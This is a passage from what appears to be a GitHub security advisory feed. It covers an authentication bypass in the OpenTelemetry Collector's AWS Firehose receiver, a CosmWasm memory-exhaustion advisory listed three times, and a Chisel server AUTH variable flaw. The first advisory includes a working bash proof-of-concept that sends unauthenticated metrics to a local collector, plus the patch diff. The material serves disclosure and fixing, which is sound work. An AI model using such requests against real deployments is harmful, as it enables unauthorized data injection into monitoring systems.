<p>When simulating Firehose requests against vulnerable versions of the Collector, we can see “UNAUTHORIZED METRICS” printed to the console via the debug exporter.
(Note this script doesn’t run on some older still-vulnerable versions that do not have the “debug” exporter.)</p>
<pre><code class="language-shell">#!/bin/bash

OTELCOL_VERSION=0.107.0
OTELCOL_BINARY="otelcol-contrib-${OTELCOL_VERSION}"
OTELCOL_PLATFORM="linux_amd64"
HOST_PORT=8081

cat &gt; config.yaml &lt;&lt; END
# https://opentelemetry.io/docs/collector/configuration/
exporters:
  debug:
    verbosity: normal
receivers:
  awsfirehose:
    endpoint : "127.0.0.1:${HOST_PORT}"
    record_type : "cwmetrics"
    access_key : "1234"
service:
  pipelines:
    metrics:
      receivers:
      - awsfirehose
      exporters:
      - debug
  telemetry:
    logs:
      encoding: "json"
      level: "debug"
END


if [ ! -x "${OTELCOL_BINARY}" ]; then
    curl --proto '=https' --tlsv1.2 -fOL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v${OTELCOL_VERSION}/otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz
    tar -xvf otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz otelcol-contrib
    mv otelcol-contrib ${OTELCOL_BINARY}
fi

"./${OTELCOL_BINARY}" --config=config.yaml &amp;
OTELCOL_PID=$!

echo "Running OTel Collector with PID ${OTELCOL_PID}"

sleep 3

# Send metrics with correct access key
if ! curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-valid"\
  -H "X-Amz-Firehose-Access-Key: 1234"\
  --data '{"requestId":"requestId-valid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJSZXF1ZXN0cyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjkuMCwiY291bnQiOjkuMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request with valid access key did not succeed"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send metrics with incorrect access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-invalid"\
  -H "X-Amz-Firehose-Access-Key: 5678"\
  --data '{"requestId":"requestId-invalid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request succeeded with invalid access key"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send unauthorized metrics without an access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-unauthorized"\
  --data '{"requestId":"requestId-unauthorized","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo -e "\n*** Vulnerability present - request with no access key succeeded ***\n"
else
    echo "Not vulnerable - request with no key was denied."
    kill ${OTELCOL_PID}
    exit 1
fi

kill ${OTELCOL_PID}
</code></pre>
<h4 id="patch">Patch</h4>
<p>The <a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/v0.107.0/receiver/awsfirehosereceiver/receiver.go#L235"><code>if</code> statement</a> makes the access key header optional, rather than the configuration optional.</p>
<p>This has been patched in #34847 to separately handle the case where access_key is not configured, and use a default-deny style:</p>
<pre><code class="language-diff">diff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go
index 6211f61221..4d78eb2778 100644
--- a/receiver/awsfirehosereceiver/receiver.go
+++ b/receiver/awsfirehosereceiver/receiver.go
@@ -233,10 +233,14 @@ func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 // validate checks the Firehose access key in the header against
 // the one passed into the Config
 func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {
-       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != "" &amp;&amp; accessKey != string(fmr.config.AccessKey) {
-               return http.StatusUnauthorized, errInvalidAccessKey
+       if string(fmr.config.AccessKey) == "" {
+               // No access key is configured - accept all requests.
+               return http.StatusAccepted, nil
+       }
+       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey == string(fmr.config.AccessKey) {
+               return http.StatusAccepted, nil
        }
-       return http.StatusAccepted, nil
+       return http.StatusUnauthorized, errInvalidAccessKey
 }

diff --git a/receiver/awsfirehosereceiver/receiver_test.go b/receiver/awsfirehosereceiver/receiver_test.go
index b02a391dd5..1ef5bdf4d3 100644
--- a/receiver/awsfirehosereceiver/receiver_test.go
+++ b/receiver/awsfirehosereceiver/receiver_test.go
@@ -123,6 +123,14 @@ func TestFirehoseRequest(t *testing.T) {
                        wantStatusCode: http.StatusUnauthorized,
                        wantErr:        errInvalidAccessKey,
                },
+               "WithNoAccessKey": {
+                       headers: map[string]string{
+                               headerFirehoseAccessKey: "",
+                       },
+                       body:           testFirehoseRequest(testFirehoseRequestID, noRecords),
+                       wantStatusCode: http.StatusUnauthorized,
+                       wantErr:        errInvalidAccessKey,
+               },
                "WithoutRequestId/Body": {
                        headers: map[string]string{
                                headerFirehoseRequestID: testFirehoseRequestID,
</code></pre>
</details>
### References

<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698">https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45043">https://nvd.nist.gov/vuln/detail/CVE-2024-45043</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74">https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac">https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac</a></li>
<li><a href="https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http">https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http</a></li>
<li><a href="https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html">https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector#alpha">https://github.com/open-telemetry/opentelemetry-collector#alpha</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver">https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0">https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib">https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib</a></li>
<li><a href="https://github.com/advisories/GHSA-prf6-xjxh-p698">https://github.com/advisories/GHSA-prf6-xjxh-p698</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-prf6-xjxh-p698</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T17:56:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jpillora/chisel] Chisel's AUTH environment variable not respected in server entrypoint]]></title>
        <id>https://github.com/advisories/GHSA-38jh-8h67-m7mj</id>
        <link href="https://github.com/advisories/GHSA-38jh-8h67-m7mj"/>
        <updated>2024-08-27T18:40:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Chisel server doesn't ever read the documented <code>AUTH</code> environment variable used to set credentials, which allows any unauthenticated user to connect, even if credentials were set. This advisory is a formalization of a report sent to the maintainer via email.</p>
<h3 id="details">Details</h3>
<p>In the help page for the <code>chisel server</code> subcommand, it mentions an <code>AUTH</code> environment variable that can be set in order to provide credentials that the server should authenticate connections against: <a href="https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138">https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138</a>.</p>
<p>The issue is that the server entrypoint doesn't ever read the <code>AUTH</code> environment variable. The only place that this happens is in the client entrypoint: <a href="https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452">https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452</a></p>
<p>This subverts the expectations set by the documentation, allowing unauthenticated users to connect to a Chisel server, even if auth is attempted to be set up in this manner.</p>
<h3 id="poc">PoC</h3>
<p>Run <code>chisel server</code>, first specifying credentials with the <code>AUTH</code> environment variable, then with the <code>--auth</code> argument. In the first case, the server allows connections without authentication, while in the second, the correct behavior is exhibited.</p>
<h3 id="impact">Impact</h3>
<p>Anyone who is running the Chisel server, and that is using the <code>AUTH</code> environment variable to specify credentials to authenticate against. Chisel is often used to provide an entrypoint to a private network, which means services that are gated by Chisel may be affected. Additionally, Chisel is often used for exposing services to the internet. An attacker could MITM requests by connecting to a Chisel server and requesting to forward traffic from a remote port. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jpillora/chisel/security/advisories/GHSA-38jh-8h67-m7mj">https://github.com/jpillora/chisel/security/advisories/GHSA-38jh-8h67-m7mj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43798">https://nvd.nist.gov/vuln/detail/CVE-2024-43798</a></li>
<li><a href="https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138">https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138</a></li>
<li><a href="https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452">https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452</a></li>
<li><a href="https://github.com/advisories/GHSA-38jh-8h67-m7mj">https://github.com/advisories/GHSA-38jh-8h67-m7mj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38jh-8h67-m7mj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-27T18:40:29.000Z</published>
    </entry>
</feed>